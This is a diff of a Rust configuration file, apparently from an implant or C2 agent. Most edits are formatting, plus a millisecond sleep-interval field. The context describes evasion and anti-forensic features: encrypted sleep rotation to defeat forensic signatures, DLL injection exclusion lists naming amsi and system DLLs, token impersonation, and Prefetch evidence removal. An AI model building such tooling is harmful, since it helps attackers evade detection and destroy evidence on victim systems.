@@ -65,9 +65,7 @@ pub enum SleepMethod {
 /// Rotation between schemes defeats forensic signatures that target a
 /// specific ciphertext structure (e.g. XChaCha20-Poly1305's 24-byte nonce
 /// + 16-byte tag pattern).
-#[derive(
-    serde::Serialize, serde::Deserialize, Debug, Clone, Copy, PartialEq, Eq, Default,
-)]
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Copy, PartialEq, Eq, Default)]
 #[serde(rename_all = "kebab-case")]
 pub enum SleepScheme {
     /// XChaCha20-Poly1305 AEAD (24-byte nonce, 16-byte tag). Default.
@@ -126,6 +124,8 @@ pub struct SleepConfig {
     pub method: SleepMethod,
     #[serde(default = "default_base_interval")]
     pub base_interval_secs: u64,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub base_interval_ms: Option<u64>,
     #[serde(default = "default_jitter_percent")]
     pub jitter_percent: u32,
     #[serde(default)]
@@ -851,6 +851,7 @@ impl Default for SleepConfig {
         Self {
             method: SleepMethod::Standard,
             base_interval_secs: default_base_interval(),
+            base_interval_ms: None,
             jitter_percent: default_jitter_percent(),
             working_hours_start: None,
             working_hours_end: None,
@@ -1204,8 +1205,18 @@ mod injection_tests {
     #[test]
     fn test_dll_excluded_builtin_patterns() {
         let builtin: &[&str] = &[
-            "ntdll", "kernel32", "kernelbase", "amsi", "ws2_32", "wininet",
-            "user32", "gdi32", "advapi32", "ole32", "shell32", "crypt32",
+            "ntdll",
+            "kernel32",
+            "kernelbase",
+            "amsi",
+            "ws2_32",
+            "wininet",
+            "user32",
+            "gdi32",
+            "advapi32",
+            "ole32",
+            "shell32",
+            "crypt32",
         ];
         let operator: Vec<String> = Vec::new();
 
@@ -1225,7 +1236,11 @@ mod injection_tests {
         let operator: Vec<String> = vec!["suspicious".to_string(), "malware".to_string()];
 
         assert!(is_dll_excluded("suspicious_lib.dll", &operator, builtin));
-        assert!(is_dll_excluded("some_malware_helper.dll", &operator, builtin));
+        assert!(is_dll_excluded(
+            "some_malware_helper.dll",
+            &operator,
+            builtin
+        ));
         assert!(!is_dll_excluded("dwmapi.dll", &operator, builtin));
     }
 
@@ -1438,10 +1453,10 @@ pub struct Config {
     #[serde(default)]
     pub token_impersonation: TokenImpersonationConfig,
 
-       /// Configuration for Windows Prefetch evidence removal.  Cleans .pf
+    /// Configuration for Windows Prefetch evidence removal.  Cleans .pf
     /// files after injection or on-demand to prevent forensic timeline
     /// analysis.  Supports delete, patch (preferred), and service-disable
-       /// methods.  Only effective when compiled with the `forensic-cleanup`
+    /// methods.  Only effective when compiled with the `forensic-cleanup`
     /// feature.
     #[serde(default)]
     pub prefetch: PrefetchConfig,
@@ -1605,10 +1620,7 @@ pub fn default_module_cache_dir() -> String {
         // Never fall back to /tmp which is world-writable (M-38 fix).
         let cache_base = std::env::var_os("XDG_CACHE_HOME")
             .map(PathBuf::from)
-            .or_else(|| {
-                std::env::var_os("HOME")
-                    .map(|h| PathBuf::from(h).join(".cache"))
-            });
+            .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".cache")));
         cache_base
             .map(|p| p.join("sysd").join("modules"))
             .unwrap_or_default()
@@ -1684,17 +1696,32 @@ mod tests {
     #[test]
     fn default_allowed_paths_linux() {
         let paths = default_allowed_paths();
-        assert!(paths.iter().any(|p| p == "/var/log"), "Linux should include /var/log");
-        assert!(paths.iter().any(|p| p == "/home"), "Linux should include /home");
-        assert!(paths.iter().any(|p| p == "/tmp"), "Linux should include /tmp");
+        assert!(
+            paths.iter().any(|p| p == "/var/log"),
+            "Linux should include /var/log"
+        );
+        assert!(
+            paths.iter().any(|p| p == "/home"),
+            "Linux should include /home"
+        );
+        assert!(
+            paths.iter().any(|p| p == "/tmp"),
+            "Linux should include /tmp"
+        );
     }
 
     #[cfg(target_os = "macos")]
     #[test]
     fn default_allowed_paths_macos() {
         let paths = default_allowed_paths();
-        assert!(paths.iter().any(|p| p == "/Users"), "macOS should include /Users");
-        assert!(paths.iter().any(|p| p == "/tmp"), "macOS should include /tmp");
+        assert!(
+            paths.iter().any(|p| p == "/Users"),
+            "macOS should include /Users"
+        );
+        assert!(
+            paths.iter().any(|p| p == "/tmp"),
+            "macOS should include /tmp"
+        );
     }
 
     #[cfg(target_os = "windows")]
@@ -1717,14 +1744,14 @@ mod tests {
         let cache = &cfg.module_cache_dir;
         // The module_cache_dir must be reachable via allowed_paths
         // (either directly or through a parent prefix).
-        let reachable = cfg.allowed_paths.iter().any(|p| {
-            cache.starts_with(p.as_str()) || p.starts_with(cache.as_str())
-        });
+        let reachable = cfg
+            .allowed_paths
+            .iter()
+            .any(|p| cache.starts_with(p.as_str()) || p.starts_with(cache.as_str()));
         assert!(
             reachable,
             "module_cache_dir '{}' is not covered by allowed_paths: {:?}",
-            cache,
-            cfg.allowed_paths
+            cache, cfg.allowed_paths
         );
     }
 
